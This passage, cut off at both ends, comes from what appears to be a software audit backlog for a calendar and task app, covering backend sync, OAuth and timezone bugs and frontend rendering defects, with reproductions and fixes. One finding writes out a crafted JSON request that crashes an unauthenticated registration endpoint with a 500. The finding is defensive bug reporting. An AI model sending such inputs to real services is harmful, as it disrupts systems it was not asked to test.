    current = self.dav.get(row["href"])
    try:
        self.dav.put(new_href, current.data, if_none_match="*")
    except (PreconditionFailed, Conflict) as e:
        ...
        raise ConflictError(f"event {uid} already exists in the target calendar") from e
    try:
        self.dav.delete(row["href"], if_match=current.etag)
    except PreconditionFailed as e:      # <-- only this one rolls the copy back

Reproduced with a fake DAV whose DELETE reply is lost once (script at /tmp/claude-0/-home-user-smylte/e3078780-8be9-5e55-813c-5e8f796288f0/scratchpad/agent-scratch/poc_move.py):

    attempt 1:
      -> DavError transport error on DELETE /u/a/e-1.ics: connection reset
      server hrefs: ['/u/a/e-1.ics', '/u/b/e-1.ics']      <-- event now in BOTH calendars
    attempt 2 (retry):
      -> ConflictError event e-1 already exists in the target calendar
      server hrefs: ['/u/a/e-1.ics', '/u/b/e-1.ics']      <-- and it stays that way, forever
      cache src row: True | cache dst row: False

After the next 30 s sync sweep the SPA renders the same event in both the source and the destination calendar, and the booking-conflict/busy set counts it twice.

No test covers this: test_backlog_aug19_stage3_core.py:781 states in its own docstring "No test covers any move failure path — test_api.py:262 covers the happy path and an unknown destination id", and it only added the pre-existing-foreign-copy case.
```

</details>

**Suggested fix.** Give the destination PUT the same replay tolerance `_put_new` has: on
`PreconditionFailed`/`Conflict`, GET `new_href` (and, for the 409 spelling, look the UID
up in the destination) and, if the occupant carries the UID being moved, treat the copy
as already done and fall through to the source delete instead of raising. Only a
genuinely foreign occupant is a real ConflictError. Additionally, roll the copy back for
any exception from the source DELETE where the delete provably did not happen, or at
minimum log it so the duplicate is discoverable.

**Pinned by** `test_a_move_whose_delete_reply_was_lost_can_still_be_completed` in `backend/tests/test_backlog_aug25_stage3.py`.

**Fixed** with the suggested fix's first half and NOT its second. A new `_adopt_moved_copy` gives the destination PUT the replay tolerance `_put_new` already has: on `PreconditionFailed`/`Conflict` it reads the occupant of `new_href`, and a resource carrying the UID being moved is this move's own earlier copy — the move falls through to the source delete and completes. Only a stranger, or a `no-uid-conflict` 409 whose occupant is not at `new_href` at all, is still a `ConflictError`, which is what the control asserts and what `_put_new`'s own comment draws the line at.

**The adopted copy is REFRESHED from the wire, not merely accepted** — a deliberate addition the finding does not ask for. `move_event` reads the bytes off the wire precisely because another client may edit the event inside the window, and a retry reopens that window: the destination holds the first attempt's bytes while the source, about to be deleted, holds the newer ones. Accepting the occupant unchanged discards that revision in exactly the way this method's docstring says it must not, so the adopt path re-PUTs `current.data` under `if_match=stored.etag`. `test_the_retry_carries_the_revision_the_source_holds_NOW` pins it, and a mutation that only accepts fails there.

**The rollback was deliberately NOT widened, and that is a decision the entry should record.** The finding offers "roll the copy back for any exception from the source DELETE" as an alternative, and the pin accepts either because both reach the same end state *when the delete provably did not happen*. A transport error is a lost REPLY as often as a lost request, and the two are indistinguishable from this side — so rolling back there deletes the one remaining copy and the event is gone from BOTH calendars. That mutation passed the pin and the control; `test_a_delete_that_happened_but_was_not_heard_does_not_destroy_the_event` now catches it. A duplicate is recoverable, a deletion is not. The 412 branch keeps its rollback: there the server ANSWERED, which is the "provably did not happen" the entry means.

**The other exceptions take the entry's minimum instead**: `log.error(..., exc_info=True)` naming the uid, both hrefs and the fact that the event is in two calendars until the move is retried — discoverable rather than silent, and now actually retryable.

#### [x] A lone surrogate in a dynamic-client-registration body is echoed into the error response and 500s the unauthenticated /oauth/register endpoint
`backend/tasksd/mcp/oauth.py:257` · **low** · bug · minor

`OAuthServer.register` interpolates two wholly attacker-chosen JSON values straight into
the `error_description` it raises: ```python unknown = requested - set(SUPPORTED_SCOPES)
if unknown: raise OAuthError("invalid_client_metadata", f"unsupported scope: {'
'.join(sorted(unknown))}") # oauth.py:250 ... auth_method =
body.get("token_endpoint_auth_method") or "none" if auth_method not in ("none",
"client_secret_post", "client_secret_basic"): raise
OAuthError("invalid_client_metadata", f"unsupported token_endpoint_auth_method:
{auth_method}") # oauth.py:257 ``` `routes._oauth_error` then renders that string with
Starlette's `JSONResponse` (routes.py:62), whose `render` is `json.dumps(content,
ensure_ascii=False, allow_nan=False, ...).encode("utf-8")`. `json.loads` happily
produces a lone surrogate from a `\udXXX` escape, `json.dumps(..., ensure_ascii=False)`
passes it through unescaped, and `.encode("utf-8")` then raises `UnicodeEncodeError` —
inside the route handler, outside every handler in this module. The caller gets a bare
500 and the log gets a full traceback. This is exactly the failure class the comment
three lines above (oauth.py:239-242, "registration is open and its body is wholly
attacker-chosen ... a JSON list or number was an AttributeError escaping as a 500 rather
than the 400 the sibling fields below already produce") was written to close; the type
guard was added for `scope` but the *content* of these two fields still reaches the
renderer raw. Note this can only arrive through a JSON body: query strings are decoded
with `errors='replace'`, so `parse_authorize`'s identical `f"unsupported scope: ..."` is
safe. The two JSON-bodied endpoints in this subsystem — `/oauth/register` and `/mcp` —
are the reachable ones.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy with a `TestClient(app, raise_server_exceptions=False)` on an app built with `mcp_enabled=True`:

```
POST /oauth/register  Content-Type: application/json
{"redirect_uris":["https://x.test/cb"],"scope":"\ud800"}
->  500 'Internal Server Error'

POST /oauth/register  Content-Type: application/json
{"redirect_uris":["https://x.test/cb"],"token_endpoint_auth_method":"\ud800"}
->  500 'Internal Server Error'
```

With `raise_server_exceptions=True` the underlying exception is visible:
`UnicodeEncodeError: 'utf-8' codec can't encode character '\ud800' in position 75: surrogates not allowed`

Inputs -> wrong result: an anonymous internet caller sends one ~60-byte JSON body to the open registration endpoint and gets a 500 plus a logged traceback, where the code's own contract (and every sibling metadata check) is a 400 `invalid_client_metadata`.
```

</details>

**Suggested fix.** Render these responses with a JSON encoder that cannot fail on unpaired surrogates —
e.g. a local `JSONResponse` subclass whose `render` uses `json.dumps(content,
ensure_ascii=True, allow_nan=False, separators=(",", ":")).encode()` — and use it in
`_oauth_error` (routes.py:62) and at routes.py:506. Belt-and-braces: reject non-
encodable metadata up front in `register`, or interpolate with `!r` (as `token()`
already does for `grant_type`) so the value is escaped to ASCII before it reaches the
response.

#### [x] smylte_review_day on the last representable day raises an unhandled OverflowError reported as "the calendar server may be unreachable"
`backend/tasksd/mcp/api.py:1279` · **low** · bug · minor

`span_end = end if ranged else (date.fromisoformat(start) +
timedelta(days=1)).isoformat()` does unguarded date arithmetic on a day the caller
supplies. `_day_or_today` accepts "9999-12-31" (it is a real calendar date), and adding
a day overflows. OverflowError is not a ValueError and nothing on this path catches it,
so McpServer._call's catch-all turns it into the misleading sentence the codebase has
already fixed twice — once for `find_free_time` on the same boundary ("MAX_RANGE_DAYS
bounds how LONG the range is, not where it ends ... raised OverflowError — outside every
handler, from an argument the calling model chooses", api.py:807) and once for PATCH
/api/calendars/{id}/events/{uid}, which maps OverflowError to a 422.

<details><summary>Evidence</summary>

```
smylte_review_day {"day":"9999-12-31"} ->
  {"content":[{"type":"text","text":"smylte_review_day could not be completed (OverflowError). The calendar server may be unreachable; try again shortly."}],"isError":true}

Traceback: api.py:1280 `date.fromisoformat(start) + timedelta(days=1)` -> OverflowError: date value out of range.
{"day":"9999-12-30"} answers normally. GET /api/day/9999-12-31 is unaffected — this is MCP-only.
```

</details>

**Suggested fix.** Saturate instead of overflowing, the same way find_free_time's `if day >= date.max:
break` does: d = date.fromisoformat(start) span_end = (d +
timedelta(days=1)).isoformat() if d < date.max else d.isoformat() (or clamp
`_day_or_today` to a sane horizon).

#### [x] Every write derived from an occurrence anchor is a FLOATING time, so "this and following", "this event" and "delete this event" all strip a series of its timezone
`backend/tasksd/ical/edit.py:696` · **medium** · bug · stage 3 · found in remediation

Found while verifying, for Stage 3's cadence fix, that `split_series` really re-rules
the tail. It does — and it also drops the TZID. The tail is written with a new UID and
`DTSTART` set to the anchor, and the serialized property comes out as bare
`DTSTART:20260107T090000` with no `TZID` parameter and no trailing `Z`, even when the
source resource carries `DTSTART;TZID=America/Chicago` AND a matching `VTIMEZONE`
component (which survives into the tail unused). RFC 5545 §3.3.5 makes a form-1
DATE-TIME a FLOATING time: it means "09:00 wherever the reader is", not "09:00 in
Chicago". So every occurrence from the split point on stops being an instant and becomes
a wall clock — it reads at 09:00 UTC on a UTC host, moves relative to the rest of the
owner's calendar, and stops shifting with DST while the head (which keeps its TZID)
keeps shifting. The head and the tail of one series now disagree about what time the
event is.

<details><summary>Evidence</summary>

```
In-process against ical.split_series, source resource carrying a full VTIMEZONE:

  source VEVENT:  DTSTART;TZID=America/Chicago:20260105T090000
                  RRULE:FREQ=DAILY;COUNT=6

  split_series(raw, "2026-01-07T09:00:00", EventEdit())

  head VEVENT DTSTART: 'DTSTART;TZID=America/Chicago:20260105T090000'   <- kept
  tail VEVENT DTSTART: 'DTSTART:20260107T090000'                        <- FLOATING
  tail parsed tzinfo:  None
  tail still contains a VTIMEZONE component: True

Reached from the SPA in two clicks: open any occurrence of a zoned repeating event,
change anything, press Save, answer "This & following". The same path is taken by
"delete this and following" (service.delete_event -> split_event(..., delete_tail=True)),
which discards the tail — so that half is unaffected.
```

</details>

**Suggested fix.** Carry the master's DTSTART/DTEND value type and TZID onto the tail
rather than writing the anchor bare — the anchor is already resolved in the master's own
zone by `_anchor_from_iso`, so the zone is in hand at the point the tail is built. An
all-day series must stay `VALUE=DATE`, and a UTC series should stay UTC. Assert the
round trip on all three shapes (TZID+VTIMEZONE, `Z`, `VALUE=DATE`), not just that the
occurrences expand — an expansion computed on the same host cannot tell a floating time
from a correctly zoned one.

**WIDER THAN FIRST RECORDED, and the widening is the finding.** The entry above was
written against `split_series` alone, because that is the path the cadence fix had made
it look at. Driving the other two anchor consumers found the same defect in both, each
failing differently:

```
Same zoned series, anchor "2026-01-07T09:00:00" (the form the read path emits):

  split_series      -> DTSTART:20260107T090000          the tail drifts from its own head
  apply_occurrence_override
                    -> RECURRENCE-ID:20260107T090000    stops matching the generated
                       DTSTART:20260107T090000          instance: the override renders as
                                                        a DUPLICATE beside the original
  exclude_occurrence -> EXDATE:20260107T090000          excludes nothing: the deleted
                                                        occurrence comes back

A UTC series loses its zone too: DTSTART:20260107T150000, not ...150000Z.
```

The RECURRENCE-ID case is the sharp one, and this repo already knows why: `split_series`'
own comments describe an override whose anchor stopped matching as rendering "as a
duplicate alongside the generated instance", and aug19 closed a HIGH on an orphan
RECURRENCE-ID reading back as a live occurrence and blocking an hour on the public
booking page.

**Fixed** in `_anchor_from_iso`, which is the one place all three read their anchor from.
It already had an arm re-expressing an AWARE ISO in the master's real zone, with a
docstring explaining that a numeric offset would otherwise serialize as a fabricated
`TZID="UTC-06:00"`. The arm that was missing is the one that runs in production: the read
path emits, and the SPA sends back, a NAIVE local ISO in the series' own zone. The zone
is now ATTACHED to it — not converted, because the value already IS a reading in that
zone.

**A guard as wide as the set it enumerates, again** — the pattern this sweep's own header
names. The aware arm was correct, documented, and covered one of the two ways an anchor
arrives.

**Attached, not converted, and the test says so exactly.** Reading the naive anchor as UTC
and converting produces a value that carries a zone and names a DIFFERENT INSTANT: 09:00
Chicago is not 09:00 UTC. Both that and a hard-coded UTC attach were caught only by
accident at first — through `_require_occurrence` rejecting an anchor that had stopped
naming an occurrence — so the assertion is now the exact serialized line,
`DTSTART;TZID=America/Chicago:20260107T090000`.

**Two controls.** An all-day anchor is a `date` and keeps no zone, because `VALUE=DATE` is
the whole of what makes an event all-day — a mutation attaching a zone to every anchor
turned an all-day series timed and broke four tests in `test_recur.py` besides. And a
series already in UTC stays in UTC rather than acquiring a TZID from anywhere.

**Covered by** `test_a_value_written_from_an_anchor_keeps_the_series_timezone` (3 cases),
`test_an_all_day_anchor_is_still_written_as_a_date` and
`test_a_series_that_is_already_in_utc_stays_in_utc` in
`backend/tests/test_backlog_aug25_stage3.py`.

### Frontend & mobile

#### [x] The `settings_updated` SSE event is dropped entirely, so a second tab/device silently destroys the other's preference change
`frontend/src/App.tsx:561` · **high** · bug

`service.update_settings` publishes `{"type": "settings_updated"}` with the comment
"Notify other open tabs/devices so the change syncs live", but App's SSE handler returns
early on that type and nothing else in the app ever re-reads `/api/settings` — the
settings effect's deps are `[auth, applyTheme, showToast]`, so it runs only on an auth
transition. A tab that has been open since this morning therefore holds a snapshot of
the settings blob from this morning. Because `store.update_settings` does a shallow
`current.update(patch)` (db/store.py:1210-1211), every one of the read-modify-write
preferences listed in `MERGED_SETTINGS` — `task_groups`, `hidden_lists`,
`hidden_calendars`, `archived_calendars`, `collapsed_tasks`, `collapsed_groups`,
`dashboard`, `calendar_task_lists`, `tab_order`, `appearance` — is written back WHOLE
from that stale snapshot, replacing whatever the other device stored. This is the same
data-loss class `MERGED_SETTINGS`/`settingsFailed` was built for (a failed read), but
through a successful-then-stale read, which that machinery does not cover.

<details><summary>Evidence</summary>

```
App.tsx:558-566:
```
const unsubscribe = subscribe((type) => {
  if (type === 'settings_updated') return
  clearTimeout(timer)
  timer = setTimeout(() => setRev((r) => r + 1), 250)
}, onExpire)
```
and App.tsx:190-192 — the only `api.getSettings()` call, in an effect keyed on `[auth, applyTheme, showToast]`.

Failure scenario: desktop tab open all day holding `task_groups: [G1]`. On the phone the owner creates group G2 -> PUT `{task_groups:[G1,G2]}`; the server stores both and publishes `settings_updated`; the desktop tab ignores it. That evening the owner renames G1 in the desktop tab -> `changeTaskGroups([G1'])` -> PUT `{task_groups:[G1']}` -> shallow merge -> **G2 is gone from the account**, on both devices, with no error. Same shape destroys a saved custom theme: create a theme on the phone, then pick a preset on the stale desktop tab and `{appearance: <stale>}` wipes the `themes` collection.
```

</details>

**Suggested fix.** On `settings_updated`, re-run the settings read (a separate `settingsRev` state that
only the `api.getSettings()` effect depends on) instead of dropping the event — it must
NOT bump `rev`, which is what the early return was protecting. Re-applying the server
blob is exactly what the publisher intends, and it costs one request per genuine
preference change rather than the 1+N task refetch storm the early return was added to
stop.

#### [x] A failed scheduling fetch renders the owner's Scheduling tab as "you have no booking links"
`frontend/src/components/SchedulingView.tsx:31` · **medium** · bug

The one load effect wraps `Promise.all([schedulingLinks, calendars,
schedulingBookings])` in `guard(...)`. `makeGuard` swallows every non-401 failure and
returns undefined, so none of the three `setState` calls run and `links`/`bookings` stay
at their initial `[]`. The view has no loading or error state, so `links.length === 0`
and `upcoming.length === 0` both render their EMPTY copy. A 502/429/timeout on GET
/api/scheduling/links therefore tells the owner, in prose, that they have never created
a booking link and that nothing is booked. There is no retry path either — `rev` only
changes on an unrelated SSE event.

<details><summary>Evidence</summary>

```
```
useEffect(() => {
  guard(async () => {
    const [ls, cs, bs] = await Promise.all([
      api.schedulingLinks(), api.calendars(), api.schedulingBookings(),
    ])
    setLinks(ls); setCals(cs); setBookings(bs)
  })
}, [rev])
...
{links.length === 0 && (
  <div className="empty" ...>Create a booking link, share it with a client, and their pick lands on your calendar.</div>
)}
...
{upcoming.length === 0 && (<div className="empty" ...>Nothing booked yet.</div>)}
```
Reproduced (vitest, jsdom): `m.schedulingLinks.mockRejectedValue(new HttpError(502,'calendar server unavailable'))`, render `<SchedulingView rev={0} onExpire={vi.fn()} />`. Rendered body text is exactly:
`"SchedulingNew linkCreate a booking link, share it with a client, and their pick lands on your calendar.Upcoming bookingsNothing booked yet."`
The owner's live, published booking links are on screen as "you have none", with only a transient toast to say otherwise.
```

</details>

**Suggested fix.** Track a load phase (`loading` / `ready` / `failed`) alongside the data. Render the two
empty-state strings only when the fetch actually succeeded and returned nothing; on
failure render an error card with a "Try again" button that re-runs the effect. This is
the same repair already applied to ArchivedCalendarsSection and the calendar month
fetch.

#### [x] A failed booking-link toggle rolls back a whole-array snapshot, reverting a concurrent toggle the server accepted
`frontend/src/components/SchedulingView.tsx:56` · **medium** · bug · minor · stage 3

`toggleEnabled` (and `remove`, line 63) captures `const prev = links` — the entire array
as of that render — and on failure does `setLinks(prev)`. Any write that landed while
the first request was in flight is inside that snapshot in its OLD state, so a failure
on one link silently un-does a successful change to a different link. The screen then
disagrees with the server about which public URLs are live, and nothing refetches to
correct it.

<details><summary>Evidence</summary>

```
```
const toggleEnabled = async (l: BookingLink) => {
  const prev = links                                        // whole-array snapshot
  setLinks(links.map((x) => (x.token === l.token ? { ...x, enabled: !l.enabled } : x)))
  const updated = await guard(() => api.patchSchedulingLink(l.token, { enabled: !l.enabled }))
  if (!updated) setLinks(prev)                              // clobbers B's accepted write
}
```
Reproduced: two links A and B, both enabled. Tap A's toggle (PATCH hangs), then tap B's toggle (PATCH resolves, server now has B disabled). Both checkboxes read off. A's PATCH then rejects with 502 -> `setLinks(prev)` restores `[A(on), B(on)]`. Measured checkbox state after: `[true, true]`; correct is `[true, false]`. The owner is now looking at a link labelled "Live" that the server has switched off — and if they "fix" it by toggling it, they turn it back ON.
```

</details>

**Suggested fix.** Roll back only the row that failed, with a functional update: `if (!updated)
setLinks((ls) => ls.map((x) => (x.token === l.token ? l : x)))`. For `remove`, re-insert
only `l` (at its recorded index) rather than restoring `prev`.

**Pinned by** `2026-08-25 — a failed booking-link toggle > rolls back only the link that failed` in `frontend/src/backlog.aug25.stage3.test.tsx`.

**Fixed** with the suggested fix in both methods, and then one level finer than it asks. `toggleEnabled` rolls back functionally and per row — but restores only the FIELD it wrote (`{ ...x, enabled: l.enabled }`), not the row `l`. The same link can be EDITED while its toggle is in flight: the editor's save replaces that row with the server's DTO, and putting the pre-tap row back wholesale reverts the new title — which is this finding's own defect, one level down. `l.enabled` rather than a negation of whatever is there now, so a second failure cannot leave it flipped. `test ... keeps an edit that landed while the same link's toggle was in flight` pins it; restoring `l` wholesale passes the pin and the control and fails there.

**`remove` remembers the POSITION, not the array**, which is what `data.tsx`'s reorder does with `sort_order` for the same reason. A failed delete re-inserts one link at the index it was removed from, and only if it is not already back (a refetch may have beaten it). Appending instead passes the pin and the control — the finding's own repro deletes the last link, where "at its index" and "at the end" are the same place — so the test deletes the FIRST of three and asserts the order.

**The optimistic paints were made functional too**, though nothing pins that: `setLinks(links.map(...))` reads the array from the render the tap came from, so two writes started before either repaints would each map a stale array and the later setState would win outright. React batches inside a render, so this is not reachable through jsdom user events and is recorded as defensive rather than claimed as tested.

#### [x] The booking-link editor's scrim is still a bare onClick, so a drag-select releasing outside discards the whole form
`frontend/src/components/SchedulingView.tsx:307` · **medium** · bug · minor

AUDIT.md records this as fixed ("The booking-link editor breaks the modal contract every
other modal keeps: no Escape, no dialog role, and an onClick scrim over the app's
longest form"). Escape and `role="dialog"` did land; the scrim did not. `LinkModal`'s
overlay is `onClick={onClose}` while every other dialog in the app — TaskModal,
PlanRitual, ShutdownRitual, AddMultipleModal, AppearancePanel — carries the two-event
mousedown/click guard, with TaskModal's comment spelling out exactly why. A `click`
whose mousedown was inside the modal and whose mouseup was on the scrim is dispatched at
their nearest common ancestor, which IS the overlay, so `.modal`'s `stopPropagation`
never sees it.

<details><summary>Evidence</summary>

```
SchedulingView.tsx:307
```
<div className="overlay" onClick={onClose}>
  <div className="modal sched-modal" role="dialog" aria-modal="true" ... onClick={(e) => e.stopPropagation()}>
```
vs TaskModal.tsx:128
```
<div className="overlay"
  onMouseDown={(e) => { scrimPress.current = e.target === e.currentTarget }}
  onClick={(e) => { if (e.target === e.currentTarget && scrimPress.current) onClose(); scrimPress.current = false }}>
```
Reproduced: open New link, type "Quarterly review", then press inside the Timezone field, drag left out of the sheet and release on the scrim (`mouseDown(tzInput); mouseUp(overlay); click(overlay)` — the exact event sequence a browser emits). `queryByRole('dialog')` is null: title, description, timezone, buffer, min-notice, horizon and the whole seven-day availability grid are gone, with no confirmation and no way back.
```

</details>

**Suggested fix.** Copy the guard the other five dialogs use: a `scrimPress` ref set in `onMouseDown` when
`e.target === e.currentTarget`, and close in `onClick` only when both the press and the
release landed on the scrim.

#### [x] The Duration field clamps on every keystroke, so most durations cannot be typed at all
`frontend/src/components/SchedulingView.tsx:337` · **medium** · bug

`onChange` clamps to `min=5` on each keystroke and rewrites the controlled value, so the
first digit of any two-digit duration below 50 is destroyed before the second digit is
typed. `Number('') || 30` also makes the field unclearable. `<input type="number">` has
no spinner buttons in iOS Safari or Chrome on Android, so on a phone the owner has no
way at all to set a 15-, 20-, 30- or 45-minute link — the four most common values this
feature exists for.

<details><summary>Evidence</summary>

```
```
<input className="input" type="number" min={5} max={480} step={5} value={duration}
  onChange={(e) => setDuration(Math.max(5, Math.min(480, Number(e.target.value) || 30)))} />
```
Reproduced: open New link (field shows 30), select-all and type `4` -> `Number('4')=4`, `Math.max(5,4)=5`, field re-renders as "5". Measured: `dur.value === '5'` after the first keystroke. The next keystroke appends to "5", so typing "45" yields 55 and typing "15" yields 55. Separately, clearing the field (`value: ''`) gives `Number('')||30 = 30` — measured `dur.value === '30'`, i.e. the field snaps back and cannot be emptied to retype. The same `|| <default>` shape makes "Days ahead" jump to 30 the moment a leading `0` is typed.
```

</details>

**Suggested fix.** Hold the raw string in state and clamp on blur/submit rather than on change (or clamp
only the max on change and the min on blur), and allow the empty string as a transient
value. `type="number"`'s own `min`/`max` attributes already give the browser-level
guard.

#### [x] The public booking page renders literally nothing while it loads — and forever on a 401
`frontend/src/components/BookingPage.tsx:159` · **medium** · rendering

`phase` starts at `'loading'` and that branch returns `null`. main.tsx mounts
`<BookingPage>` directly with no shell or spinner, so the one page an anonymous stranger
opens is a blank white document for the whole round trip — and `public_link_info` runs
slot generation and busy expansion under the global service lock, so that is seconds,
not milliseconds, on a loaded server. There is no AbortController or timeout, so a
request that never settles (phone entering a tunnel, captive portal black-holing the
socket) leaves the page blank indefinitely with no error and no retry. The "Try again"
button on the `unavailable` card calls `setPhase('loading')`, so a retry on a flaky
connection replaces a readable error card with the same blank page. Finally, `load`'s
`if (e instanceof AuthError) return null` returns without touching `phase`, so any 401
reaching this endpoint (a reverse proxy or CDN auth layer in front of /api, an Access
policy that covers /api/public/*) pins the page blank permanently.

<details><summary>Evidence</summary>

```
```
if (phase === 'loading') return null
...
catch (e) {
  if (e instanceof AuthError) return null      // phase stays 'loading' -> blank forever
  if (!opts.keepPhase) setPhase(e instanceof HttpError && e.status === 404 ? 'notfound' : 'unavailable')
  return null
}
...
<button className="btn" onClick={() => { setPhase('loading'); load() }}>Try again</button>
```
Reproduced: with `publicBookingInfo` returning a never-settling promise, `container.innerHTML === ''` — no brand, no card, no spinner. With `publicBookingInfo` rejecting `new AuthError('authentication required')`, `container.innerHTML` is still `''` after the microtask queue drains: no not-found card, no unavailable card, no retry button.
```

</details>

**Suggested fix.** Render the brand/skeleton card in the `loading` phase instead of `null` (the
`notfound`/`unavailable` cards already have the markup), give `api.publicBookingInfo` an
AbortController timeout that surfaces as `unavailable`, and drop the `AuthError` special
case here — a public page has no session, so a 401 is just another transport failure and
belongs in `unavailable`.

#### [x] The public booking form's three fields are unlabelled — the only form in the app a stranger fills in
`frontend/src/components/BookingPage.tsx:284` · **medium** · rendering · minor

"Your name", "Email" and "Notes (optional)" are `<label>` elements that neither wrap
their control nor carry `htmlFor`, so none of the three inputs has an accessible name.
Every other form in the app uses the htmlFor/id pair explicitly — Login (whose comment
calls it "the pair every other form in the app uses"), TaskModal, CalendarView's event
editor, TabsSection, CapacitySection, AppearancePanel, PlanRitual, ShutdownRitual.
BookingPage and SchedulingView's LinkModal are the two that do not, and BookingPage is
the page an anonymous visitor loads on a phone with a screen reader. LinkModal has the
same defect across eight controls (Title, Description, Calendar, Duration, Timezone,
Buffer, Min notice, Days ahead — SchedulingView.tsx:316, 323, 329, 335, 341, 402, 407,
412), where three unnamed bare number inputs sit side by side.

<details><summary>Evidence</summary>

```
```
<div className="field">
  <label className="label">Your name</label>
  <input className="input" autoFocus value={name} maxLength={200} onChange={...} />
</div>
<div className="field">
  <label className="label">Email</label>
  <input className="input" type="email" value={email} maxLength={320} onChange={...} />
</div>
```
Reproduced: render BookingPage, click a slot, then `screen.queryByLabelText(/your name/i)` -> null and `screen.queryByLabelText(/^email$/i)` -> null. VoiceOver/TalkBack announce three unnamed "edit text" fields on the booking form; the Confirm button stays disabled until both are filled and the user cannot tell which is which.
```

</details>

**Suggested fix.** Add `htmlFor`/`id` pairs (`book-name`, `book-email`, `book-notes`) exactly as Login.tsx
and TaskModal.tsx do, and the same for LinkModal's eight controls.

#### [x] Three Today/Shutdown inputs override the mobile 16px floor, re-arming iOS Safari's zoom-on-focus
`frontend/src/styles/app.css:1573` · **medium** · rendering · minor

The @media (max-width: 720px) block sets `.input { font-size: max(16px, calc(16px *
var(--fs-scale))) }` at line 872 to stop iOS Safari auto-zooming when a form control
under 16px takes focus. Three later rules — `.shut-date` (1478), `.shut-reflect` (1485)
and `.today-est-input` (1573) — declare font-size at the same (0,1,0) specificity but
LATER in the same stylesheet, so they win in every viewport. All three elements carry
`className="input …"`. This is the third time this exact regression has shipped: lines
1281-1294 restore the floor for `.bulk-row .input`, `.sched-range .input` and `.appear-
text` and spell out the source-order reason verbatim — the whole Today-tab CSS fence
(1355-1884), added after that fix, was never checked against it.

<details><summary>Evidence</summary>

```
app.css:872 (inside @media max-width:720px)
  .input { font-size: max(16px, calc(16px * var(--fs-scale))); }
app.css:1476  .shut-date { flex: none; width: 132px; padding: 2px 6px; color: var(--fg-muted);
                font-size: calc(11px * var(--fs-scale)); }
app.css:1484  .shut-reflect { font: inherit; font-size: calc(14px * var(--fs-scale)); … }
app.css:1571  .today-est-input { flex: none; width: 62px; padding: 2px 4px;
                font-family: var(--mono); font-size: calc(11px * var(--fs-scale)); }

Consumers (all carry `.input`, so all are governed by the floor rule and all beat it):
  ShutdownRitual.tsx:281  <input type="date" className="input shut-date" …>
  ShutdownRitual.tsx:310  <textarea id="shut-reflect" className="input shut-reflect" rows={4} autoFocus …>
  TodayView.tsx:2511      <input className="input today-est-input" type="number" autoFocus …>

Failure scenario (iPhone, Safari, 390x844, shipped default --fs-scale: 1):
  Today tab -> tap the `est` cell on any row. TodayView swaps the button for
  `.today-est-input`, which is autoFocus, and it renders at calc(11px * 1) = 11px.
  Safari zooms the page to bring the sub-16px field up to size, and it does NOT
  zoom back out on blur — the layout viewport stays scaled, so every subsequent
  tap on the Today list lands offset from what is drawn. At the Appearance
  editor's MAXIMUM --fs-scale of 1.4 (appearance.ts:96) this is still
  11 * 1.4 = 15.4px, i.e. there is no setting that avoids it.
  Same on Shutdown: `.today-shutdown` -> the reflection step focuses
  `.shut-reflect` automatically at 14px, and the middle step's date arm is 11px.
```

</details>

**Suggested fix.** Extend the existing restoration rule inside the mobile block (app.css:1288) to name
these three as well, e.g. `.bulk-row .input, .sched-range .input, .shut-date, .shut-
reflect, .today-est-input { font-size: max(16px, calc(16px * var(--fs-scale))); }` — or,
better, move the floor to a rule that cannot be beaten by source order (e.g. `@media
(max-width: 720px) { input.input, select.input, textarea.input { font-size: max(16px, …)
} }`, specificity (0,1,1)) so the next dense-row rule added below cannot silently undo
it again.

#### [x] A foreign event/task title with no spaces makes the whole calendar or tasks pane scroll sideways on a phone
`frontend/src/styles/app.css:601` · **medium** · rendering · minor

`.agenda-ev`, `.task-title` and `.today-title` render summaries authored by other CalDAV
clients and carry no `overflow-wrap`/`word-break`. A summary that is one long token — a
pasted URL is the everyday case — has no soft wrap opportunity, so the text overflows
its box. Both scroll containers it lands in (`.cal-scroll` and `.scroll`) declare only
`overflow-y: auto`, which per CSS Overflow computes `overflow-x` to `auto` as well, so
the overflow turns into horizontal scrolling of the entire pane — dragging the month
grid off screen with it. The stylesheet already applies this guard elsewhere for the
same reason (`.day-card-title` 462, `.sched-card-title` 920, `.sched-card-meta` 928,
`.toast span` 908, `.today-chip-sum`/`-fate` 1368/1379); these three were missed.

<details><summary>Evidence</summary>

```
app.css:601
  .agenda-ev { display: flex; align-items: baseline; gap: 10px; width: 100%; … padding: 12px 14px;
               font-size: calc(15px * var(--fs-scale)); … }
  .agenda-ev .t { … min-width: 58px; flex: none; }
app.css:359  .task-title { font-size: calc(15px * var(--fs-scale)); color: var(--fg); }
app.css:1543 .today-title { flex: 1; min-width: 0; font-size: calc(15px * var(--fs-scale)); color: var(--fg); }
app.css:474  .cal-scroll { flex: 1; min-height: 0; overflow-y: auto; }      /* -> overflow-x: auto */
app.css:286  .scroll { flex: 1; overflow-y: auto; padding: 6px 0 40px; }     /* -> overflow-x: auto */

DayPopover.tsx:36-41 (AgendaEvent) puts the summary in an UNCLASSED <span>, a flex
item whose default min-width:auto resolves to min-content = the longest word:
  <span className="t">{label(ev, day, tf)}</span>
  <span>{ev.is_recurring && …}{ev.summary || '(untitled)'}</span>

Failure scenario (iPhone 390x844, Calendar tab):
  Tasks.org/DAVx5 writes an event whose SUMMARY is a 150-character URL with no
  spaces. Tap that day -> CalendarView.tsx:696 renders the mobile `.day-agenda`
  below the grid. Row width available to the summary is 390 - 28 (padding)
  - 58 (.t) - 10 (gap) = 294px; the token needs roughly 1200px at 15px.
  `.cal-scroll` gains ~900px of scrollable width, so a horizontal swipe anywhere
  in the calendar pane drags the month grid off the left edge. The same input as
  a TASK SUMMARY does it to `.scroll` on the Tasks and Today tabs.
  Note this defeats the `.cal-grid { grid-template-columns: repeat(7, minmax(0,1fr)) }`
  fix (app.css:488) that mobile-layout.test.ts pins: the grid itself no longer
  overflows, but its scroll parent does.
```

</details>

**Suggested fix.** Add `overflow-wrap: anywhere` (and `min-width: 0` on the agenda's summary span, e.g.
give it a class or use `.agenda-ev > span:last-child`) to `.agenda-ev`, `.task-title`
and `.today-title`, matching what `.day-card-title` and `.today-chip-sum` already do.
Belt-and-braces: state `overflow-x: hidden` explicitly on `.scroll` and `.cal-scroll` so
no future unwrapped child can turn either into a horizontal scroller.

#### [x] --fg-faint is 2.30:1 against the shipped light background — below WCAG AA for text and below 3:1 for the controls that use it
`frontend/src/styles/tokens.css:13` · **medium** · rendering

`--fg-faint: rgba(20, 19, 26, 0.36)` composited over `--bg: #FBFAF7` is
rgb(168,167,167), a contrast ratio of 2.30:1 (2.32 on --bg-elev, 2.28 on --paper). It
